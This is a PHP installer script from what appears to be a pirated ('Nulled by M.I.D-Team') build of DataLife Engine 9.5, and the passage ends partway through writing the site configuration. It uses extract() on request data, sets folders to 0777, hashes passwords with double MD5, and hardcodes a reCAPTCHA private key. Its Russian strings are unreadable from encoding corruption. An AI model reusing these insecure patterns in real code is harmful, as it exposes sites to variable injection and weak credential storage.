<?php
/*
=====================================================
 DataLife Engine - by SoftNews Media Group 
-----------------------------------------------------
 http://dle-news.ru/
-----------------------------------------------------
 Copyright (c) 2004,2012 SoftNews Media Group
=====================================================
 ������ ��� ������� ���������� �������
=====================================================
 ����: install.php
-----------------------------------------------------
 ����������: ��������� �������
=====================================================
*/
session_start();

@error_reporting ( E_ALL ^ E_WARNING ^ E_NOTICE );
@ini_set ( 'display_errors', true );
@ini_set ( 'html_errors', false );
@ini_set ( 'error_reporting', E_ALL ^ E_WARNING ^ E_NOTICE );

define('DATALIFEENGINE', true);
define('ROOT_DIR', dirname (__FILE__));
define('ENGINE_DIR', ROOT_DIR.'/engine');

$config['charset'] = "windows-1251";

require_once(ROOT_DIR.'/language/Russian/adminpanel.lng');
require_once(ENGINE_DIR.'/inc/include/functions.inc.php');
require_once(ENGINE_DIR.'/skins/default.skin.php');

extract($_REQUEST, EXTR_SKIP);

if($_REQUEST['action'] == "eula")
{

if ( !$_SESSION['dle_install'] ) msg( "", "������", "��������� ������� ���� ������ �� � ������. ��������� �� ������� �������� ������ ��������� �������: <br /><br /><a href=\"http://{$_SERVER['HTTP_HOST']}/install.php\">http://{$_SERVER['HTTP_HOST']}/install.php</a>" );

echoheader("", "");
echo <<<HTML
<form id="check-eula" method="post" action="">
<script language='javascript'>
check_eula = function()
{
	if( document.getElementById( 'eula' ).checked == true )
	{
		return true;
	}
	else
	{
		alert( '�� ������ ������� ������������ ����������, ������ ��� ���������� ���������.' );
		return false;
	}
}
document.getElementById( 'check-eula' ).onsubmit = check_eula;
</script>
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">������������ ����������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
    <tr>
        <td style="padding:2px;">����������, ����������� ���������� � ������� ���������������� ���������� �� ������������� DataLife Engine.<br /><br /><div style="height: 300px; border: 1px solid #76774C; background-color: #FDFDD3; padding: 5px; overflow: auto;"><b>������������ ���������� ��������� ������������</b><br /><br /><b>������� ������������� ����������</b><br /><br />��������� ���������� ������������� ���������� �������� ����� ������������� ����� ������������ ����� ������������ �������� <b>DataLife Engine</b>, �&nbsp;������� �&nbsp;��&nbsp;��������, ������������� ��������� �����������.<br /><br /><b>���������� ��������</b><br /><br />���� ������������ ������� �&nbsp;������� ������������ ����� ������������ ����� ������������ �������� DataLife Engine ��&nbsp;������� �������� ����� <b>������ ����</b>. ���� ��&nbsp;��������� ����� ������������, �� ������ ��&nbsp;���������� ��� ��������, ��&nbsp;��� ����������� ������� ����� ��������������� �&nbsp;������ ������, ��&nbsp;���&nbsp;����� ����������� ��������� �&nbsp;���&nbsp;�������������� ����� ������ �������, ��&nbsp;����������� ����������� ���������� �������.<br /><br />� ������ ������������ � ������������� ������ ������� �������� �� ������, ������������ ��������, �� ����� �������� ������������� ����������, �������������� ������ ��������������� ����������� ����� �� ������������: �������������� �������������, ����� ������ �������, ����������� ���������� �������. ����������� ��������� �� ������� ��������� �� ���������������. ��� ��������� ����������� ��������� �� �������, ������������� ���������� ����� ��������, ���������� � ���� ������ ����������� ���������, ���� ���� ����������� �� ������ ����������� ���������.<br /><br />�� ��������� ��&nbsp;����� ����� ����������� ������ ��������� ������������� ����� ����������� ���������. �� ��������� ��&nbsp;����� ����� �&nbsp;����� ����� �������� ������� ������� ��������, ��&nbsp;������ �������� ��&nbsp;����� �������� ����. ��������� ������� �������� ����� ��������� ������������� ��&nbsp;����������� ����� ��&nbsp;������, ��������� ���&nbsp;������������ �������.<br /><br /><b>������������ �������������</b><br /><br />���������� �������� ��&nbsp;����������� ������� <b>DataLife Engine</b>, �� ������ �����, ���&nbsp;��&nbsp;������������ ��������� ����� ��&nbsp;����������� �������. �� ������������ ������ <b>����� ��&nbsp;�������������</b> ������������ �������� ��&nbsp;������������ ��� ����� (����� ������ ������� ������ � ��� ����������), ������������� ��� ���&nbsp;������ �������. ���&nbsp;������������� ������� ��&nbsp;������ �����, ��� ���������� ����������� �������� ��������. ����������� ����������� ������� ������� �����, �&nbsp;���� �� ������������ ������ ���&nbsp;����� ��������, ��&nbsp;�� ������� ���������� ����� �������� �&nbsp;������ ������������ �����������. ����� � ������ ������������ ������� �� ��� ������������ �������������, � ��� ��������� �� ����� ����� ��������, ��� ���������� �������� ���������� ������ �� ����� dle-news.ru ����� ����������, � ��������� ������ �� �� ����� ������������ �� ��������� ����� ��������.<br /><br /><b>����� �&nbsp;����������� ������</b><br /><br /><b>���������� ����� �����:</b><ul><li>�������� ������ �&nbsp;��������� ������������ ���� �&nbsp;������������ �&nbsp;������� ������ �����.</li><li>����������� �&nbsp;�������������� ���������� ��&nbsp;��������� ���� ������������ �������� �&nbsp;�������� ������, ���� �&nbsp;��� ����� ������� �������� ��&nbsp;������������� ������������ ������������ �������� ��&nbsp;����� �����������. �����������, ������������� ���� ��������������, ��&nbsp;�������� �������������� SoftNews Media Group, ���� ��&nbsp;�������� ����������� ���� ��������������� �������.</li><li>��������� ������, ������� ����� ����������������� �&nbsp;������ ������������ ������, �&nbsp;��������� ��&nbsp;��, ���&nbsp;��� ��� ������������ �������.</li><li>���������� ����������� ������� ��&nbsp;������ ���� ����� ������������� ����������� ��� ��&nbsp;����, �&nbsp;����� ������� �������� ������� �&nbsp;����������� �����.</li></ul><br /><b>���������� ��&nbsp;����� �����:</b><ul><li>���������� ����� ��&nbsp;������������� ������������ �������� ������� �����.</li><li>�������� ��������� ����������� �����, ������� ���������, �&nbsp;����� �������� ����������� ���������</li><li>��������� ��������� ��������������� ��������, ������������ ��&nbsp;����� ����������� ����</li><li>������������ ����� ������������ �������� DataLife Engine ��&nbsp;����� �������� �� ����� ��� ����� ����� (����� ������ ������� ������ � ��� ����������)</li><li>�������������, ��������� ���&nbsp;����������� ��&nbsp;����� ����� ��������� ����� ������ ������������ ��������</li><li>�������������� ���&nbsp;������������� ��������������� �������������� ����� ������������ �������� DataLife Engine</li><li>������� ��������� �������� ������� ������������ �������� ��&nbsp;������������� �������</li></ul><b>����������� ����������� ������������</b><br /><br />�� ����� ��������, ���&nbsp;��������� ������������, ������������� ��&nbsp;<b>DataLife Engine</b>, ����� ��������� �����������, �&nbsp;�������� ��&nbsp;��, ���&nbsp;�� ��������� ������������ ������ ��&nbsp;����������� ������������ �������, �� ������ ���� ����������� �&nbsp;����������� ���������� �������� ��&nbsp;������ ������ �����. ���&nbsp;�� ���� �������� �&nbsp;����������� ��������� ��&nbsp;���������������� ��&nbsp;�����������, ������������� ������� ��������, ������� ��������� ������������ ����, �����, �������� �������, �&nbsp;����� ��&nbsp;��������� ������������� ������, ��������� ���������� �������� ��������������. ���� ����������� ������� ������� ���� ���&nbsp;������� ��������, ��&nbsp;�� ������ �������� ��� �&nbsp;����������� ���������. �� ������ ���� �����������, ���&nbsp;����������� ������� <b>DataLife Engine</b> ��&nbsp;�������� �������� ���&nbsp;������ ��-��&nbsp;���������� �������� ���������� ����������� ������� ��&nbsp;�����������.<br /><br /><b>����� ��&nbsp;���������������� �������������</b><br /><br />�������� <b>DataLife Engine</b>, �&nbsp;����� �������� �&nbsp;������ ������� ������� �������� �������������� <b>SoftNews Media Group</b>, ��&nbsp;����������� �������, ����� ���&nbsp;���������� ������� ����������� ������ ��� ��������. ����������� ������� ������� ������� ��&nbsp;��������� ������. ����� ����������� ������������ ���������, ����������� �&nbsp;���������� ������������� ������ �������, �&nbsp;��������� �&nbsp;���� ����� ��&nbsp;���, �������� �������������� ������������ �&nbsp;�������� �������. SoftNews Media Group ��&nbsp;����� ������� ��������������� ��&nbsp;���������� ������, ����������� ������������� ������� DataLife Engine.<br /><br /><b>��������� ����������� ���������� ������������</b><br /><br />������ ���������� ������������ �������������, ���� �� ������������� ��������� ������� ������ ��������. ������ ������������ ���������� ����� ���� ����������� ���� �&nbsp;������������� �������, �&nbsp;������ ������������ ������ ��������� ������� ������������� ����������. �&nbsp;������ ���������� ����������� �������� �� ���������� ������� ��� ���� ����� ������ ������������ �������� �&nbsp;������� 3 ������� ����, �&nbsp;������� ��������� ���������������� �����������.</div>
		<input type='checkbox' name='eula' id='eula'><b>� �������� ������ ����������</b>
		<br />
</td>
    </tr>
    <tr>
        <td style="padding:2px;"><input type=hidden name=action value="function_check"><input class=buttons type=submit value=" ���������� >> "></td>
    </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;

}
elseif($_REQUEST['action'] == "function_check")
{

if ( !$_SESSION['dle_install'] ) msg( "", "������", "��������� ������� ���� ������ �� � ������. ��������� �� ������� �������� ������ ��������� �������: <br /><br /><a href=\"http://{$_SERVER['HTTP_HOST']}/install.php\">http://{$_SERVER['HTTP_HOST']}/install.php</a>" );

echoheader("", "");

echo <<<HTML
<form method="post" action="">
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">�������� ������������� ����������� PHP</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
HTML;

echo"<tr>
<td height=\"25\" width=\"250\">&nbsp;����������� ���������� �������
<td height=\"25\" colspan=2>&nbsp;������� ��������
<tr><td colspan=3><div class=\"hr_line\"></div></td></tr>";
 
$status = phpversion() < '5.1' ? '<font color=red><b>���</b></font>' : '<font color=green><b>��</b></font>';

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;������ PHP 5.1 � ����</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = function_exists('mysql_connect') ? '<font color=green><b>��</b></font>' : '<font color=red><b>���</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;��������� MySQL</td>
         <td colspan=2>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";


$status = extension_loaded('zlib') ? '<font color=green><b>��</b></font>' : '<font color=red><b>���</b></font>';

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;��������� ������ ZLib</td>
         <td colspan=2>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = extension_loaded('xml') ? '<font color=green><b>��</b></font>' : '<font color=red><b>���</b></font>';

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;��������� XML</td>
         <td colspan=2>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = function_exists('iconv') ? '<font color=green><b>��</b></font>' : '<font color=red><b>���</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;��������� iconv</td>
         <td colspan=2>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

   echo"<tr>
         <td colspan=3 class=\"navigation\"><br />���� ����� �� ���� ������� ������� �������, �� ���������� ��������� �������� ��� ����������� ���������. � ������ ������������ ����������� ���������� ������� �������� ��� ������������ ������ � �������.<br /><br /></td>
         </tr>";

echo"<tr><td colspan=3><div class=\"hr_line\"></div></td></tr><tr>
<td height=\"25\">&nbsp;������������� ���������
<td height=\"25\" width=\"200\">&nbsp;������������� ��������
<td height=\"25\">&nbsp;������� ��������
<tr><td colspan=3><div class=\"hr_line\"></div></td></tr>";

$status = ini_get('safe_mode') ? '<font color=red><b>��������</b></font>' : '<font color=green><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;Safe Mode</td>
         <td>&nbsp;���������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = function_exists('mysqli_connect') ? '<font color=green><b>��</b></font>' : '<font color=red><b>���</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;��������� MySQLi</td>
         <td>&nbsp;��</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";


$status = ini_get('file_uploads') ? '<font color=green><b>��������</b></font>' : '<font color=red><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;�������� ������</td>
         <td>&nbsp;��������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = ini_get('output_buffering') ? '<font color=red><b>��������</b></font>' : '<font color=green><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;����������� ������</td>
         <td>&nbsp;���������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = ini_get('magic_quotes_runtime') ? '<font color=red><b>��������</b></font>' : '<font color=green><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;Magic Quotes Runtime</td>
         <td>&nbsp;���������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = ini_get('register_globals') ? '<font color=red><b>��������</b></font>' : '<font color=green><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;Register Globals</td>
         <td>&nbsp;���������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

$status = ini_get('session.auto_start') ? '<font color=red><b>��������</b></font>' : '<font color=green><b>���������</b></font>';;

   echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;Session auto start</td>
         <td>&nbsp;���������</td>
         <td>&nbsp;$status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";

   echo"<tr>
         <td colspan=3 class=\"navigation\"><br />������ ��������� �������� �������������� ��� ������ �������������, ������ ������ �������� �������� ���� ���� ������������� ��������� ����������� � ��������.<br /><br /></td>
         </tr>";

echo <<<HTML
     <tr>
     <td height="40" colspan=3 align="right">&nbsp;&nbsp;
     <input class=buttons type=submit value="&nbsp;&nbsp;���������� >>&nbsp;&nbsp;">&nbsp;&nbsp;<input type=hidden name="action" value="chmod_check">
     </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;

} 
// ********************************************************************************
// �������� ���� �� ������
// ********************************************************************************
elseif($_REQUEST['action'] == "chmod_check")
{

if ( !$_SESSION['dle_install'] ) msg( "", "������", "��������� ������� ���� ������ �� � ������. ��������� �� ������� �������� ������ ��������� �������: <br /><br /><a href=\"http://{$_SERVER['HTTP_HOST']}/install.php\">http://{$_SERVER['HTTP_HOST']}/install.php</a>" );

echoheader("", "");

echo <<<HTML
<form method="post" action="">
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">�������� �� ������ � ������ ������ �������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
HTML;

echo"<tr>
<td height=\"25\">&nbsp;�����/����
<td width=\"100\" height=\"25\">&nbsp;CHMOD
<td width=\"100\" height=\"25\">&nbsp;������</tr><tr><td colspan=3><div class=\"hr_line\"></div></td></tr>";
 
$important_files = array(
'./backup/',
'./engine/data/',
'./engine/cache/',
'./engine/cache/system/',
'./uploads/',
'./uploads/files/',
'./uploads/fotos/',
'./uploads/posts/',
'./uploads/posts/thumbs/',
'./uploads/thumbs/',
'./templates/',
'./templates/Default/',
);


$chmod_errors = 0;
$not_found_errors = 0;
    foreach($important_files as $file){

        if(!file_exists($file)){
            $file_status = "<font color=red>�� ������!</font>";
            $not_found_errors ++;
        }
        elseif(is_writable($file)){
            $file_status = "<font color=green>���������</font>";
        }
        else{
            @chmod($file, 0777);
            if(is_writable($file)){
                $file_status = "<font color=green>���������</font>";
            }else{
                @chmod("$file", 0755);
                if(is_writable($file)){
                    $file_status = "<font color=green>���������</font>";
                }else{
                    $file_status = "<font color=red>���������</font>";
                    $chmod_errors ++;
                }
            }
        }
        $chmod_value = @decoct(@fileperms($file)) % 1000;

    echo"<tr>
         <td height=\"22\" class=\"tableborder main\">&nbsp;$file</td>
         <td>&nbsp; $chmod_value</td>
         <td>&nbsp; $file_status</td>
         </tr><tr><td background=\"engine/skins/images/mline.gif\" height=1 colspan=3></td></tr>";
    }
if($chmod_errors == 0 and $not_found_errors == 0){
$status_report = '�������� ������� ���������! ������ ���������� ���������!';
}else{
if($chmod_errors > 0){
$status_report = "<font color=red>��������!!!</font><br /><br />�� ����� �������� ���������� ������: <b>$chmod_errors</b>. ��������� ������ � ����.<br />�� ������ ��������� ��� ����� CHMOD 777, ��� ������ CHMOD 666, ��������� ���-������.<br /><br /><font color=red><b>������������ �� �������������</b></font> ���������� ���������, ���� �� ����� ����������� ���������.<br />";
}
if($not_found_errors > 0){
$status_report .= "<font color=red>��������!!!</font><br />�� ����� �������� ���������� ������: <b>$not_found_errors</b>. ����� �� �������!<br /><br /><font color=red><b>�� �������������</b></font> ���������� ���������, ���� �� ����� ����������� ���������.<br />";
}
}

echo"<tr><td colspan=3><div class=\"hr_line\"></div></td></tr><tr><td height=\"25\" colspan=3>&nbsp;&nbsp;��������� ��������</td></tr><tr><td style=\"padding: 5px\" colspan=3>$status_report</td></tr><tr><td colspan=3><div class=\"hr_line\"></div></td></tr>";    

echo <<<HTML
     <tr>
     <td height="40" colspan=3 align="right">&nbsp;&nbsp;
     <input class=buttons type=submit value="&nbsp;&nbsp;���������� >>&nbsp;&nbsp;">&nbsp;&nbsp;<input type=hidden name="action" value="doconfig">
     </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;

} elseif($_REQUEST['action'] == "doconfig")
{

if ( !$_SESSION['dle_install'] ) msg( "", "������", "��������� ������� ���� ������ �� � ������. ��������� �� ������� �������� ������ ��������� �������: <br /><br /><a href=\"http://{$_SERVER['HTTP_HOST']}/install.php\">http://{$_SERVER['HTTP_HOST']}/install.php</a>" );


$url  = preg_replace( "'/install.php'", "", $_SERVER['HTTP_REFERER']);
$url  = preg_replace( "'\?(.*)'", "", $url);
if(substr("$url", -1) == "/"){ $url = substr($url, 0, -1); }
echoheader("", "");
echo <<<HTML
<form method="post" action="">
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">��������� ������������ �������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
HTML;


echo'<tr>
<td width="175" style="padding: 5px;">URL �����:
<td style="padding: 5px;"><input name=url value="'.$url.'/" size=38 type=text class="edit"><br><span class="navigation">������� ���� ��� ����� �����, ���� ����� <font color="red">/</font> �� ����� ����������</span></tr>
<tr><td colspan="3" height="40">&nbsp;&nbsp;<b>������ ��� ������� � MySQL �������</b><td></tr>
<tr><td style="padding: 5px;">������ MySQL:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbhost" value="localhost"></tr>
<tr><td style="padding: 5px;">��� ���� ������:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbname"></tr>
<tr><td style="padding: 5px;">��� ������������:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbuser"></tr>
<tr><td style="padding: 5px;">������:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbpasswd"></tr>
<tr><td style="padding: 5px;">�������:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbprefix" value="dle"> <span class="navigation">�� ��������� ��������, ���� �� ������ ��� ���� �� ������������</span></tr>
<tr><td style="padding: 5px;">��������� ��� MySQL:<td style="padding: 5px;"><input class="edit" type=text size="28" name="dbcollate" value="cp1251"> <span class="navigation">�� ��������� ��������, ���� �� ������ ��� ���� �� ������������</span></tr>
<tr><td colspan="3"  height="40">&nbsp;&nbsp;<b>������ ��� ������� � ������ ����������</b><td></tr>
<tr><td style="padding: 5px;">��� ��������������:<td style="padding: 5px;"><input class="edit" type=text size="28" name="reg_username" ></tr>
<tr><td style="padding: 5px;">������:<td style="padding: 5px;"><input class="edit" type=password size="28" name="reg_password1"> <span class="navigation"><b>��</b> �������� ������!</span></tr>
<tr><td style="padding: 5px;">��������� ������:<td style="padding: 5px;"><input class="edit" type=password size="28" name="reg_password2"></tr>
<tr><td style="padding: 5px;">E-mail:<td style="padding: 5px;"><input class="edit" type=text size="28" name="reg_email"></tr>
<tr><td colspan="3"  height="40">&nbsp;&nbsp;<b>�������������� ���������</b><td></tr>
<tr><td style="padding: 5px;">�������� ��������� ���:
<td style="padding: 5px;">
<select class=rating name="alt_url"><option value="yes">��</option><option value="no">���</option></select>&nbsp;&nbsp;<span class="navigation">E��� �� ��������� ��������� ���, �� �� �������� ������� ���� .htaccess � �������� �����</span>
</tr>';

echo <<<HTML
     <tr>
     <td height="40" colspan=3 align="right">&nbsp;&nbsp;
     <input class=buttons type=submit value="&nbsp;&nbsp;���������� >>&nbsp;&nbsp;">&nbsp;&nbsp;<input type=hidden name="action" value="doinstall">
     </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;

}
// ********************************************************************************
// Do Install
// ********************************************************************************
elseif($_REQUEST['action'] == "doinstall")
{

	if ( !$_SESSION['dle_install'] ) msg( "", "������", "��������� ������� ���� ������ �� � ������. ��������� �� ������� �������� ������ ��������� �������: <br /><br /><a href=\"http://{$_SERVER['HTTP_HOST']}/install.php\">http://{$_SERVER['HTTP_HOST']}/install.php</a>" );

    if(!$reg_username or !$reg_email or !$reg_password1 or !$url or $reg_password1 != $reg_password2){ msg("error", "������!!!" ,"��������� ����������� ����!", "javascript:history.go(-1)"); }
	if (preg_match("/[\||\'|\<|\>|\"|\!|\$|\@|\&\~\*\+]/", $reg_username))
	{	
		msg("error", "������!!!" ,"��������� ��� �������������� ����������� � �����������!", "javascript:history.go(-1)");	 
	}

    $reg_password = md5(md5($reg_password1));

	$url = htmlspecialchars( $url, ENT_QUOTES);
	$reg_email = htmlspecialchars( $reg_email, ENT_QUOTES);
	$alt_url = htmlspecialchars( $alt_url, ENT_QUOTES);
	$url = str_replace( "$", "&#036;", $url );
	$reg_email = str_replace( "$", "&#036;", $reg_email );
	$alt_url = str_replace( "$", "&#036;", $alt_url );


$config = <<<HTML
<?PHP

//System Configurations

\$config = array (

'version_id' => "9.5",

'home_title' => "DataLife Engine Nulled by M.I.D-Team",

'http_home_url' => "$url",

'charset' => "windows-1251",

'admin_mail' => "$reg_email",

'description' => "���������������� �������� ������ DataLife Engine",

'keywords' => "DataLife, Engine, CMS, PHP ������",

'date_adjust' => "0",

'site_offline' => "no",

'allow_alt_url' => "$alt_url",

'langs' => "Russian",

'skin' => "Default",

'allow_gzip' => "no",

'allow_admin_wysiwyg' => "no",

'allow_static_wysiwyg' => "no",

'news_number' => "10",

'smilies' => "wink,winked,smile,am,belay,feel,fellow,laughing,lol,love,no,recourse,request,sad,tongue,wassat,crying,what,bully,angry",

'timestamp_active' => "j-m-Y, H:i",

'news_sort' => "date",

'news_msort' => "DESC",

'hide_full_link' => "no",

'allow_site_wysiwyg' => "no",

'allow_comments' => "yes",

'comm_nummers' => "30",

'comm_msort' => "ASC",

'flood_time' => "30",

'auto_wrap' => "80",

'timestamp_comment' => "j F Y H:i",

'allow_comments_wysiwyg' => "no",

'allow_registration' => "yes",

'allow_cache' => "no",

'allow_votes' => "yes",

'allow_topnews' => "yes",

'allow_read_count' => "yes",

'allow_calendar' => "yes",

'allow_archives' => "yes",

'files_allow' => "yes",

'files_type' => "zip,rar,exe,doc,pdf,swf",

'files_count' => "yes",

'reg_group' => "4",

'registration_type' => "0",

'allow_sec_code' => "yes",

'allow_skin_change' => "yes",

'max_users' => "0",

'max_users_day' => "0",

'max_up_size' => "200",

'max_image_days' => "2",

'allow_watermark' => "yes",

'max_watermark' => "150",

'max_image' => "450",

'jpeg_quality' => "85",

'files_antileech' => "1",

'allow_banner' => "1",

'log_hash' => "0",

'show_sub_cats' => "1",

'tag_img_width' => "0",

'mail_metod' => "php",

'smtp_host' => "localhost",

'smtp_port' => "25",

'smtp_user' => "",

'smtp_pass' => "",

'mail_bcc' => "0",

'speedbar' => "1",

'safe_xfield' => "0",

'extra_login' => "0",

'image_align' => "left",

'ip_control' => "1",

'cache_count' => "0",

'related_news' => "1",

'no_date' => "1",

'mail_news' => "1",

'mail_comments' => "1",

'admin_path' => "admin.php",

'rss_informer' => "1",

'allow_cmod' => "0",

'max_up_side' => "0",

'files_force' => "1",

'files_max_speed' => "0",

'short_rating' => "1",

'full_search' => "0",

'allow_multi_category' => "1",

'short_title' => "���������������� ����",

'allow_rss' => "1",

'rss_mtype' => "0",

'rss_number' => "10",

'rss_format' => "1",

'comments_maxlen' => "3000",

'offline_reason' => "���� ��������� �� ������� �������������, ����� ���������� ���� ����� ���� ����� ������.<br /><br />�������� ��� ���� ��������� �� ������������ ����������.",

'catalog_sort' => "date",

'catalog_msort' => "DESC",

'related_number' => "5",

'seo_type' => "2",

'max_moderation' => "0",

'allow_quick_wysiwyg' => "0",

'sec_addnews' => "1",

'mail_pm' => "1",

'allow_change_sort' => "1",

'registration_rules' => "1",

'allow_tags' => "1",

'allow_add_tags' => "1",

'allow_fixed' => "1",

'max_file_size' => "4096",

'max_file_count' => "0",

'allow_smartphone' => "1",

'allow_smart_images' => "0",

'allow_smart_video' => "0",

'allow_search_print' => "1",

'allow_search_link' => "1",

'allow_smart_format' => "1",

'thumb_dimming' => "0",

'thumb_gallery' => "1",

'max_comments_days' => "0",

'allow_combine' => "1",

'allow_subscribe' => "1",

'parse_links' => "0",

't_seite' => "0",

'comments_minlen' => "10",

'js_min' => "0",

'outlinetype' => "0",

'fast_search' => "1",

'login_log' => "0",

'allow_recaptcha' => "0",

'recaptcha_public_key' => "6LfoOroSAAAAAEg7PViyas0nRqCN9nIztKxWcDp_",

'recaptcha_private_key' => "6LfoOroSAAAAAMgMr_BTRMZy20PFir0iGT2OQYZJ",

'recaptcha_theme' => "clean",

'search_number' => "10",

'news_navigation' => "1",

